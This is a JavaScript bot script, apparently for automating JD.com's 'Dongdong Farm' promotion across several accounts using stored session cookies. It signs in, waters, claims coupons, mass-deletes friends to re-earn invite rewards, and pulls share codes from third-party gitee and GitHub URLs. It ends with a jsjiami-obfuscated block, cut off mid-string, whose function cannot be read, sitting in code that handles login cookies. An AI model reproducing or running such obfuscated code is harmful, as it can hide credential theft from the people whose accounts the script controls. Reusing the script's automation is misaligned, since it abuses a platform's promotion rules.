    if (!$.getdata(helpSuccessPeoplesKey)) {
      //把前一天的清除
      $.setdata('', timeFormat(Date.now() - 24 * 60 * 60 * 1000) + $.farmInfo.farmUserPro.shareCode);
      $.setdata('', helpSuccessPeoplesKey);
    }
    if (helpSuccessPeoples) {
      if ($.getdata(helpSuccessPeoplesKey)) {
        $.setdata($.getdata(helpSuccessPeoplesKey) + ',' + helpSuccessPeoples, helpSuccessPeoplesKey);
      } else {
        $.setdata(helpSuccessPeoples, helpSuccessPeoplesKey);
      }
    }
    helpSuccessPeoples = $.getdata(helpSuccessPeoplesKey);
  }
  if (helpSuccessPeoples && helpSuccessPeoples.length > 0) {
    message += `【您助力的好友👬】${helpSuccessPeoples.substr(0, helpSuccessPeoples.length - 1)}\n`;
  }
  if (salveHelpAddWater > 0) {
    // message += `【助力好友👬】获得${salveHelpAddWater}g💧\n`;
    console.log(`【助力好友👬】获得${salveHelpAddWater}g💧\n`);
  }
  message += `【今日剩余助力👬】${remainTimes}次\n`;
  console.log('助力好友结束，即将开始领取额外水滴奖励\n');
}
//水滴雨
async function executeWaterRains() {
  let executeWaterRain = !$.farmTask.waterRainInit.f;
  if (executeWaterRain) {
    console.log(`水滴雨任务，每天两次，最多可得10g水滴`);
    console.log(`两次水滴雨任务是否全部完成：${$.farmTask.waterRainInit.f ? '是' : '否'}`);
    if ($.farmTask.waterRainInit.lastTime) {
      if (Date.now() < ($.farmTask.waterRainInit.lastTime + 3 * 60 * 60 * 1000)) {
        executeWaterRain = false;
        // message += `【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】未到时间，请${new Date($.farmTask.waterRainInit.lastTime + 3 * 60 * 60 * 1000).toLocaleTimeString()}再试\n`;
        console.log(`\`【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】未到时间，请${new Date($.farmTask.waterRainInit.lastTime + 3 * 60 * 60 * 1000).toLocaleTimeString()}再试\n`);
      }
    }
    if (executeWaterRain) {
      console.log(`开始水滴雨任务,这是第${$.farmTask.waterRainInit.winTimes + 1}次，剩余${2 - ($.farmTask.waterRainInit.winTimes + 1)}次`);
      await waterRainForFarm();
      console.log('水滴雨waterRain');
      if ($.waterRain.code === '0') {
        console.log('水滴雨任务执行成功，获得水滴：' + $.waterRain.addEnergy + 'g');
        console.log(`【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】获得${$.waterRain.addEnergy}g水滴\n`);
        // message += `【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】获得${$.waterRain.addEnergy}g水滴\n`;
      }
    }
  } else {
    // message += `【水滴雨】已全部完成，获得20g💧\n`;
  }
}
//打卡领水活动
async function clockInIn() {
  console.log('开始打卡领水活动（签到，关注，领券）');
  await clockInInitForFarm();
  if ($.clockInInit.code === '0') {
    // 签到得水滴
    if (!$.clockInInit.todaySigned) {
      console.log('开始今日签到');
      await clockInForFarm();
      console.log(`打卡结果${JSON.stringify($.clockInForFarmRes)}`);
      if ($.clockInForFarmRes.code === '0') {
        // message += `【第${$.clockInForFarmRes.signDay}天签到】获得${$.clockInForFarmRes.amount}g💧\n`;
        console.log(`【第${$.clockInForFarmRes.signDay}天签到】获得${$.clockInForFarmRes.amount}g💧\n`)
        if ($.clockInForFarmRes.signDay === 7) {
          //可以领取惊喜礼包
          console.log('开始领取--惊喜礼包38g水滴');
          await gotClockInGift();
          if ($.gotClockInGiftRes.code === '0') {
            // message += `【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`;
            console.log(`【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`);
          }
        }
      }
    }
    if ($.clockInInit.todaySigned && $.clockInInit.totalSigned === 7) {
      console.log('开始领取--惊喜礼包38g水滴');
      await gotClockInGift();
      if ($.gotClockInGiftRes.code === '0') {
        // message += `【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`;
        console.log(`【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`);
      }
    }
    // 限时关注得水滴
    if ($.clockInInit.themes && $.clockInInit.themes.length > 0) {
      for (let item of $.clockInInit.themes) {
        if (!item.hadGot) {
          console.log(`关注ID${item.id}`);
          await clockInFollowForFarm(item.id, "theme", "1");
          console.log(`themeStep1--结果${JSON.stringify($.themeStep1)}`);
          if ($.themeStep1.code === '0') {
            await clockInFollowForFarm(item.id, "theme", "2");
            console.log(`themeStep2--结果${JSON.stringify($.themeStep2)}`);
            if ($.themeStep2.code === '0') {
              console.log(`关注${item.name}，获得水滴${$.themeStep2.amount}g`);
            }
          }
        }
      }
    }
    // 限时领券得水滴
    if ($.clockInInit.venderCoupons && $.clockInInit.venderCoupons.length > 0) {
      for (let item of $.clockInInit.venderCoupons) {
        if (!item.hadGot) {
          console.log(`领券的ID${item.id}`);
          await clockInFollowForFarm(item.id, "venderCoupon", "1");
          console.log(`venderCouponStep1--结果${JSON.stringify($.venderCouponStep1)}`);
          if ($.venderCouponStep1.code === '0') {
            await clockInFollowForFarm(item.id, "venderCoupon", "2");
            if ($.venderCouponStep2.code === '0') {
              console.log(`venderCouponStep2--结果${JSON.stringify($.venderCouponStep2)}`);
              console.log(`从${item.name}领券，获得水滴${$.venderCouponStep2.amount}g`);
            }
          }
        }
      }
    }
  }
  console.log('开始打卡领水活动（签到，关注，领券）结束\n');
}
//
async function getAwardInviteFriend() {
  await friendListInitForFarm();//查询好友列表
  //console.log(`查询好友列表数据：${JSON.stringify($.friendList)}\n`)
  if ($.friendList) {
    console.log(`\n今日已邀请好友${$.friendList.inviteFriendCount}个 / 每日邀请上限${$.friendList.inviteFriendMax}个`);
    console.log(`开始删除${$.friendList.friends && $.friendList.friends.length}个好友,可拿每天的邀请奖励`);
    if ($.friendList.friends && $.friendList.friends.length > 0) {
      for (let friend of $.friendList.friends) {
        console.log(`\n开始删除好友 [${friend.shareCode}]`);
        const deleteFriendForFarm = await request('deleteFriendForFarm', { "shareCode": `${friend.shareCode}`,"version":8,"channel":1 });
        if (deleteFriendForFarm && deleteFriendForFarm.code === '0') {
          console.log(`删除好友 [${friend.shareCode}] 成功\n`);
        }
      }
    }
    await receiveFriendInvite();//为他人助力,接受邀请成为别人的好友
    if ($.friendList.inviteFriendCount > 0) {
      if ($.friendList.inviteFriendCount > $.friendList.inviteFriendGotAwardCount) {
        console.log('开始领取邀请好友的奖励');
        await awardInviteFriendForFarm();
        console.log(`领取邀请好友的奖励结果：：${JSON.stringify($.awardInviteFriendRes)}`);
      }
    } else {
      console.log('今日未邀请过好友')
    }
  } else {
    console.log(`查询好友列表失败\n`);
  }
}
//给好友浇水
async function doFriendsWater() {
  await friendListInitForFarm();
  console.log('开始给好友浇水...');
  await taskInitForFarm();
  const { waterFriendCountKey, waterFriendMax } = $.farmTask.waterFriendTaskInit;
  console.log(`今日已给${waterFriendCountKey}个好友浇水`);
  if (waterFriendCountKey < waterFriendMax) {
    let needWaterFriends = [];
    if ($.friendList.friends && $.friendList.friends.length > 0) {
      $.friendList.friends.map((item, index) => {
        if (item.friendState === 1) {
          if (needWaterFriends.length < (waterFriendMax - waterFriendCountKey)) {
            needWaterFriends.push(item.shareCode);
          }
        }
      });
      //TODO ,发现bug,github action运行发现有些账号第一次没有给3个好友浇水
      console.log(`需要浇水的好友列表shareCodes:${JSON.stringify(needWaterFriends)}`);
      let waterFriendsCount = 0, cardInfoStr = '';
      for (let index = 0; index < needWaterFriends.length; index ++) {
        await waterFriendForFarm(needWaterFriends[index]);
        console.log(`为第${index+1}个好友浇水结果:${JSON.stringify($.waterFriendForFarmRes)}\n`)
        if ($.waterFriendForFarmRes.code === '0') {
          waterFriendsCount ++;
          if ($.waterFriendForFarmRes.cardInfo) {
            console.log('为好友浇水获得道具了');
            if ($.waterFriendForFarmRes.cardInfo.type === 'beanCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `水滴换豆卡,`;
            } else if ($.waterFriendForFarmRes.cardInfo.type === 'fastCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `快速浇水卡,`;
            } else if ($.waterFriendForFarmRes.cardInfo.type === 'doubleCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `水滴翻倍卡,`;
            } else if ($.waterFriendForFarmRes.cardInfo.type === 'signCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `加签卡,`;
            }
          }
        } else if ($.waterFriendForFarmRes.code === '11') {
          console.log('水滴不够,跳出浇水')
        }
      }
      // message += `【好友浇水】已给${waterFriendsCount}个好友浇水,消耗${waterFriendsCount * 10}g水\n`;
      console.log(`【好友浇水】已给${waterFriendsCount}个好友浇水,消耗${waterFriendsCount * 10}g水\n`);
      if (cardInfoStr && cardInfoStr.length > 0) {
        // message += `【好友浇水奖励】${cardInfoStr.substr(0, cardInfoStr.length - 1)}\n`;
        console.log(`【好友浇水奖励】${cardInfoStr.substr(0, cardInfoStr.length - 1)}\n`);
      }
    } else {
      console.log('您的好友列表暂无好友,快去邀请您的好友吧!')
    }
  } else {
    console.log(`今日已为好友浇水量已达${waterFriendMax}个`)
  }
}
//领取给3个好友浇水后的奖励水滴
async function getWaterFriendGotAward() {
  await taskInitForFarm();
  const { waterFriendCountKey, waterFriendMax, waterFriendSendWater, waterFriendGotAward } = $.farmTask.waterFriendTaskInit
  if (waterFriendCountKey >= waterFriendMax) {
    if (!waterFriendGotAward) {
      await waterFriendGotAwardForFarm();
      console.log(`领取给${waterFriendMax}个好友浇水后的奖励水滴::${JSON.stringify($.waterFriendGotAwardRes)}`)
      if ($.waterFriendGotAwardRes.code === '0') {
        // message += `【给${waterFriendMax}好友浇水】奖励${$.waterFriendGotAwardRes.addWater}g水滴\n`;
        console.log(`【给${waterFriendMax}好友浇水】奖励${$.waterFriendGotAwardRes.addWater}g水滴\n`);
      }
    } else {
      console.log(`给好友浇水的${waterFriendSendWater}g水滴奖励已领取\n`);
      // message += `【给${waterFriendMax}好友浇水】奖励${waterFriendSendWater}g水滴已领取\n`;
    }
  } else {
    console.log(`暂未给${waterFriendMax}个好友浇水\n`);
  }
}
//接收成为对方好友的邀请
async function receiveFriendInvite() {
  for (let code of newShareCodes) {
    if (code === $.farmInfo.farmUserPro.shareCode) {
      console.log('自己不能邀请自己成为好友噢\n')
      continue
    }
    await inviteFriend(code);
    // console.log(`接收邀请成为好友结果:${JSON.stringify($.inviteFriendRes.helpResult)}`)
    if ($.inviteFriendRes.helpResult.code === '0') {
      console.log(`接收邀请成为好友结果成功,您已成为${$.inviteFriendRes.helpResult.masterUserInfo.nickName}的好友`)
    } else if ($.inviteFriendRes.helpResult.code === '17') {
      console.log(`接收邀请成为好友结果失败,对方已是您的好友`)
    }
  }
  // console.log(`开始接受6fbd26cc27ac44d6a7fed34092453f77的邀请\n`)
  // await inviteFriend('6fbd26cc27ac44d6a7fed34092453f77');
  // console.log(`接收邀请成为好友结果:${JSON.stringify($.inviteFriendRes.helpResult)}`)
  // if ($.inviteFriendRes.helpResult.code === '0') {
  //   console.log(`您已成为${$.inviteFriendRes.helpResult.masterUserInfo.nickName}的好友`)
  // } else if ($.inviteFriendRes.helpResult.code === '17') {
  //   console.log(`对方已是您的好友`)
  // }
}
async function duck() {
  for (let i = 0; i < 10; i++) {
    //这里循环十次
    await getFullCollectionReward();
    if ($.duckRes.code === '0') {
      if (!$.duckRes.hasLimit) {
        console.log(`小鸭子游戏:${$.duckRes.title}`);
        // if ($.duckRes.type !== 3) {
        //   console.log(`${$.duckRes.title}`);
        //   if ($.duckRes.type === 1) {
        //     message += `【小鸭子】为你带回了水滴\n`;
        //   } else if ($.duckRes.type === 2) {
        //     message += `【小鸭子】为你带回快速浇水卡\n`
        //   }
        // }
      } else {
        console.log(`${$.duckRes.title}`)
        break;
      }
    } else if ($.duckRes.code === '10') {
      console.log(`小鸭子游戏达到上限`)
      break;
    }
  }
}
// ========================API调用接口========================
//鸭子，点我有惊喜
async function getFullCollectionReward() {
  return new Promise(resolve => {
    const body = {"type": 2, "version": 6, "channel": 2};
    $.post(taskUrl("getFullCollectionReward", body), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东农场: API查询请求失败 ‼️‼️');
          console.log(JSON.stringify(err));
          $.logErr(err);
        } else {
          if (safeGet(data)) {
            $.duckRes = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

/**
 * 领取10次浇水奖励API
 */
async function totalWaterTaskForFarm() {
  const functionId = arguments.callee.name.toString();
  $.totalWaterReward = await request(functionId);
}
//领取首次浇水奖励API
async function firstWaterTaskForFarm() {
  const functionId = arguments.callee.name.toString();
  $.firstWaterReward = await request(functionId);
}
//领取给3个好友浇水后的奖励水滴API
async function waterFriendGotAwardForFarm() {
  const functionId = arguments.callee.name.toString();
  $.waterFriendGotAwardRes = await request(functionId, {"version": 4, "channel": 1});
}
// 查询背包道具卡API
async function myCardInfoForFarm() {
  const functionId = arguments.callee.name.toString();
  $.myCardInfoRes = await request(functionId, {"version": 5, "channel": 1});
}
//使用道具卡API
async function userMyCardForFarm(cardType) {
  const functionId = arguments.callee.name.toString();
  $.userMyCardRes = await request(functionId, {"cardType": cardType});
}
/**
 * 领取浇水过程中的阶段性奖励
 * @param type
 * @returns {Promise<void>}
 */
async function gotStageAwardForFarm(type) {
  $.gotStageAwardForFarmRes = await request(arguments.callee.name.toString(), {'type': type});
}
//浇水API
async function waterGoodForFarm() {
  await $.wait(1000);
  console.log('等待了1秒');

  const functionId = arguments.callee.name.toString();
  $.waterResult = await request(functionId);
}
// 初始化集卡抽奖活动数据API
async function initForTurntableFarm() {
  $.initForTurntableFarmRes = await request(arguments.callee.name.toString(), {version: 4, channel: 1});
}
async function lotteryForTurntableFarm() {
  await $.wait(2000);
  console.log('等待了2秒');
  $.lotteryRes = await request(arguments.callee.name.toString(), {type: 1, version: 4, channel: 1});
}

async function timingAwardForTurntableFarm() {
  $.timingAwardRes = await request(arguments.callee.name.toString(), {version: 4, channel: 1});
}

async function browserForTurntableFarm(type, adId) {
  if (type === 1) {
    console.log('浏览爆品会场');
  }
  if (type === 2) {
    console.log('天天抽奖浏览任务领取水滴');
  }
  const body = {"type": type,"adId": adId,"version":4,"channel":1};
  $.browserForTurntableFarmRes = await request(arguments.callee.name.toString(), body);
  // 浏览爆品会场8秒
}
//天天抽奖浏览任务领取水滴API
async function browserForTurntableFarm2(type) {
  const body = {"type":2,"adId": type,"version":4,"channel":1};
  $.browserForTurntableFarm2Res = await request('browserForTurntableFarm', body);
}
/**
 * 天天抽奖拿好礼-助力API(每人每天三次助力机会)
 */
async function lotteryMasterHelp() {
  $.lotteryMasterHelpRes = await request(`initForFarm`, {
    imageUrl: "",
    nickName: "",
    shareCode: arguments[0] + '-3',
    babelChannel: "3",
    version: 4,
    channel: 1
  });
}

//领取5人助力后的额外奖励API
async function masterGotFinishedTaskForFarm() {
  const functionId = arguments.callee.name.toString();
  $.masterGotFinished = await request(functionId);
}
//助力好友信息API
async function masterHelpTaskInitForFarm() {
  const functionId = arguments.callee.name.toString();
  $.masterHelpResult = await request(functionId);
}
//接受对方邀请,成为对方好友的API
async function inviteFriend() {
  $.inviteFriendRes = await request(`initForFarm`, {
    imageUrl: "",
    nickName: "",
    shareCode: arguments[0] + '-inviteFriend',
    version: 4,
    channel: 2
  });
}
// 助力好友API
async function masterHelp() {
  $.helpResult = await request(`initForFarm`, {
    imageUrl: "",
    nickName: "",
    shareCode: arguments[0],
    babelChannel: "3",
    version: 2,
    channel: 1
  });
}
/**
 * 水滴雨API
 */
async function waterRainForFarm() {
  const functionId = arguments.callee.name.toString();
  const body = {"type": 1, "hongBaoTimes": 100, "version": 3};
  $.waterRain = await request(functionId, body);
}
/**
 * 打卡领水API
 */
async function clockInInitForFarm() {
  const functionId = arguments.callee.name.toString();
  $.clockInInit = await request(functionId);
}

// 连续签到API
async function clockInForFarm() {
  const functionId = arguments.callee.name.toString();
  $.clockInForFarmRes = await request(functionId, {"type": 1});
}

//关注，领券等API
async function clockInFollowForFarm(id, type, step) {
  const functionId = arguments.callee.name.toString();
  let body = {
    id,
    type,
    step
  }
  if (type === 'theme') {
    if (step === '1') {
      $.themeStep1 = await request(functionId, body);
    } else if (step === '2') {
      $.themeStep2 = await request(functionId, body);
    }
  } else if (type === 'venderCoupon') {
    if (step === '1') {
      $.venderCouponStep1 = await request(functionId, body);
    } else if (step === '2') {
      $.venderCouponStep2 = await request(functionId, body);
    }
  }
}

// 领取连续签到7天的惊喜礼包API
async function gotClockInGift() {
  $.gotClockInGiftRes = await request('clockInForFarm', {"type": 2})
}

//定时领水API
async function gotThreeMealForFarm() {
  const functionId = arguments.callee.name.toString();
  $.threeMeal = await request(functionId);
}
/**
 * 浏览广告任务API
 * type为0时, 完成浏览任务
 * type为1时, 领取浏览任务奖励
 */
async function browseAdTaskForFarm(advertId, type) {
  const functionId = arguments.callee.name.toString();
  if (type === 0) {
    $.browseResult = await request(functionId, {advertId, type});
  } else if (type === 1) {
    $.browseRwardResult = await request(functionId, {advertId, type});
  }
}
// 被水滴砸中API
async function gotWaterGoalTaskForFarm() {
  $.goalResult = await request(arguments.callee.name.toString(), {type: 3});
}
//签到API
async function signForFarm() {
  const functionId = arguments.callee.name.toString();
  $.signResult = await request(functionId);
}
/**
 * 初始化农场, 可获取果树及用户信息API
 */
async function initForFarm() {
  return new Promise(resolve => {
    const option =  {
      url: `${JD_API_HOST}?functionId=initForFarm`,
      body: `body=${escape(JSON.stringify({"version":4}))}&appid=wh5&clientVersion=9.1.0`,
      headers: {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "zh-CN,zh;q=0.9",
        "cache-control": "no-cache",
        "cookie": cookie,
        "origin": "https://home.m.jd.com",
        "pragma": "no-cache",
        "referer": "https://home.m.jd.com/myJd/newhome.action",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
        "Content-Type": "application/x-www-form-urlencoded"
      },
      timeout: 10000,
    };
    $.post(option, (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东农场: API查询请求失败 ‼️‼️');
          console.log(JSON.stringify(err));
          $.logErr(err);
        } else {
          if (safeGet(data)) {
            $.farmInfo = JSON.parse(data)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

// 初始化任务列表API
async function taskInitForFarm() {
  console.log('\n初始化任务列表')
  const functionId = arguments.callee.name.toString();
  $.farmTask = await request(functionId);
}
//获取好友列表API
async function friendListInitForFarm() {
  $.friendList = await request('friendListInitForFarm', {"version": 4, "channel": 1});
  // console.log('aa', aa);
}
// 领取邀请好友的奖励API
async function awardInviteFriendForFarm() {
  $.awardInviteFriendRes = await request('awardInviteFriendForFarm');
}
//为好友浇水API
async function waterFriendForFarm(shareCode) {
  const body = {"shareCode": shareCode, "version": 6, "channel": 1}
  $.waterFriendForFarmRes = await request('waterFriendForFarm', body);
}
async function showMsg() {
  if ($.isNode() && process.env.FRUIT_NOTIFY_CONTROL) {
    $.ctrTemp = `${process.env.FRUIT_NOTIFY_CONTROL}` === 'false';
  } else if ($.getdata('jdFruitNotify')) {
    $.ctrTemp = $.getdata('jdFruitNotify') === 'false';
  } else {
    $.ctrTemp = `${jdNotify}` === 'false';
  }
  if ($.ctrTemp) {
    $.msg($.name, subTitle, message, option);
    if ($.isNode()) {
      allMessage += `${subTitle}\n${message}${$.index !== cookiesArr.length ? '\n\n' : ''}`;
      // await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName}`, `${subTitle}\n${message}`);
    }
  } else {
    $.log(`\n${message}\n`);
  }
}

function timeFormat(time) {
  let date;
  if (time) {
    date = new Date(time)
  } else {
    date = new Date();
  }
  return date.getFullYear() + '-' + ((date.getMonth() + 1) >= 10 ? (date.getMonth() + 1) : '0' + (date.getMonth() + 1)) + '-' + (date.getDate() >= 10 ? date.getDate() : '0' + date.getDate());
}
function readShareCode() {
  console.log(`开始`)
  return new Promise(async resolve => {
    $.get({url: "https://gitee.com/Soundantony/RandomShareCode/raw/master/JD_Fruit.json",headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }}, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，将切换为备用API`)
          console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
          $.get({url: `https://raw.githubusercontent.com/shuyeshuye/RandomShareCode/main/JD_Fruit.json`, 'timeout': 10000},(err, resp, data)=>{
          data = JSON.parse(data);})
        } else {
          if (data) {
            console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
            data = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
    await $.wait(10000);
    resolve()
  })
}
function shareCodesFormat() {
  return new Promise(async resolve => {
    // console.log(`第${$.index}个京东账号的助力码:::${jdFruitShareArr[$.index - 1]}`)
    newShareCodes = [];
    if (jdFruitShareArr[$.index - 1]) {
      newShareCodes = jdFruitShareArr[$.index - 1].split('@');
    } else {
      console.log(`由于您第${$.index}个京东账号未提供shareCode,将采纳本脚本自带的助力码\n`)
      const tempIndex = $.index > shareCodes.length ? (shareCodes.length - 1) : ($.index - 1);
      newShareCodes = shareCodes[tempIndex].split('@');
    }
    const readShareCodeRes = await readShareCode();
    if (readShareCodeRes && readShareCodeRes.code === 200) {
      // newShareCodes = newShareCodes.concat(readShareCodeRes.data || []);
      newShareCodes = [...new Set([...newShareCodes, ...(readShareCodeRes.data || [])])];
    }
    console.log(`第${$.index}个京东账号将要助力的好友${JSON.stringify(newShareCodes)}`)
    resolve();
  })
}
function requireConfig() {
  return new Promise(resolve => {
    console.log('开始获取配置文件\n')
    notify = $.isNode() ? require('./sendNotify') : '';
    //Node.js用户请在jdCookie.js处填写京东ck;
    const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
    const jdFruitShareCodes = $.isNode() ? require('./jdFruitShareCodes.js') : '';
    //IOS等用户直接用NobyDa的jd cookie
    if ($.isNode()) {
      Object.keys(jdCookieNode).forEach((item) => {
        if (jdCookieNode[item]) {
          cookiesArr.push(jdCookieNode[item])
        }
      })
      if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
    } else {
      let cookiesData = $.getdata('CookiesJD') || "[]";
      cookiesData = jsonParse(cookiesData);
      cookiesArr = cookiesData.map(item => item.cookie);
      cookiesArr.reverse();
      cookiesArr.push(...[$.getdata('CookieJD2'), $.getdata('CookieJD')]);
      cookiesArr.reverse();
      cookiesArr = cookiesArr.filter(item => item !== "" && item !== null && item !== undefined);
    }
    console.log(`共${cookiesArr.length}个京东账号\n`)
    if ($.isNode()) {
      Object.keys(jdFruitShareCodes).forEach((item) => {
        if (jdFruitShareCodes[item]) {
          jdFruitShareArr.push(jdFruitShareCodes[item])
        }
      })
    } else {
      const boxShareCodeArr = ['jd_fruit1', 'jd_fruit2', 'jd_fruit3', 'jd_fruit4'];
      const boxShareCodeArr2 = ['jd2_fruit1', 'jd2_fruit2', 'jd2_fruit3', 'jd2_fruit4'];
      const isBox1 = boxShareCodeArr.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      const isBox2 = boxShareCodeArr2.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      isBox = isBox1 ? isBox1 : isBox2;
      if (isBox1) {
        let temp = [];
        for (const item of boxShareCodeArr) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdFruitShareArr.push(temp.join('@'));
      }
      if (isBox2) {
        let temp = [];
        for (const item of boxShareCodeArr2) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdFruitShareArr.push(temp.join('@'));
      }
    }
    // console.log(`jdFruitShareArr::${JSON.stringify(jdFruitShareArr)}`)
    // console.log(`jdFruitShareArr账号长度::${jdFruitShareArr.length}`)
    console.log(`您提供了${jdFruitShareArr.length}个账号的农场助力码\n`);
    resolve()
  })
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      },
      "timeout": 10000,
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = data['base'].nickname;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function request(function_id, body = {}, timeout = 1000){
  return new Promise(resolve => {
    setTimeout(() => {
      $.get(taskUrl(function_id, body), (err, resp, data) => {
        try {
          if (err) {
            console.log('\n东东农场: API查询请求失败 ‼️‼️')
            console.log(JSON.stringify(err));
            console.log(`function_id:${function_id}`)
            $.logErr(err);
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
            }
          }
        } catch (e) {
          $.logErr(e, resp);
        } finally {
          resolve(data);
        }
      })
    }, timeout)
  })
}
function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}
function taskUrl(function_id, body = {}) {
  return {
    url: `${JD_API_HOST}?functionId=${function_id}&appid=wh5&body=${escape(JSON.stringify(body))}`,
    headers: {
      Cookie: cookie,
      UserAgent: $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
    },
    timeout: 10000,
  }
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
var _0xodc='jsjiami.com.v6',_0x3a70=[_0xodc,'w5otw5LClj8=','wr3DiBkUwog=','w5J1d8K1wojDoA==','Onw+wpc2w6hA','L8K8wp8Iw4cR','RcOAwqbCvnxrw6PDlsOK','wpvDj8O0DsKZ','w4XDssOiA8KPw5bDisKcw7HDjALDtEEywptsJsKywq3DhsOZQcOrw5Nzwq9QdT7Dkn8cw5MJ','w7XCnsOkeMO+','fzLDsHbDqQ==','wr1mwr9Wfg==','en4Lw4o7','N8KRw781Rw==','w4XDnsO6FcK1','woDCu1TDql7Chg==','wp3DlMOr','w63CosO/W8OGFcKRwpMhfSDDoMOU','RVMY','w63CksKxwpkYFMK7wq5BwoE+w77Dsw==','akglZEQ=','w6UbwpnDh8K8','IgzCrcOQRkVGwrXCjyM=','UcONwrPCqHhcw60=','w6nDl8KKecOA','w7skwrXDt8KLwrLClA==','DUU5wq4y','w5lnw6DDj8O+','w4/CosKawrw4a8OGw55ow7NVw53CicKlIxAlOj4/w5VtYwrClcOhw5cmY1nCnsOLw5l+w7cCw5UewoYZwpklwoEtCETDpsOxM8OZw6cawpvDoRxRwowMwqJ3w7/DpMOiAjE8OMOMK8ObwqvDtEXDk8KAG8ONw4nChMO1cMK+w5vDsRLCogQkw68=','e8OyZcOnwoU=','GsO/c3TDgcKxZwLCkcK9WcK+VcOqO8O9KMKIB8OFw5AVCwoAwp7CiMKLNGcaIcKyw4F6GCcqwooYP8K0w7vCuQ==','woXDisKCYMO0PcKmw65aGEfCgsKiNGjDn8OWw4Anw6DCmQMpw7VIfMOeIgM9acKGw5zCu8OZVcOBw6BWO3XCsVfDuR/Cpl4fCmkZw4nCu0XCl8K5I8ORZMOAwqHDhcKtOMKtYcK2fTVFwq7DsMOQRcK1wrDDrGM4w6Raw7lZwqMIVg==','w6BSwqzCgsOl','w5cIwobDvcKZ','w7xhw7zDpMOb','EFkVwpow','wpDDn8OrPsOo','VcO9wpwbYQ==','wr1sw6g8wpI=','worDmQDCk8K7','SMOoXsOJ','wp0WUw==','wp8YWWs=','EwjCs8Op6K+B5rOr5aad6LWx77+s6K+G5qO65p+b57yX6LSt6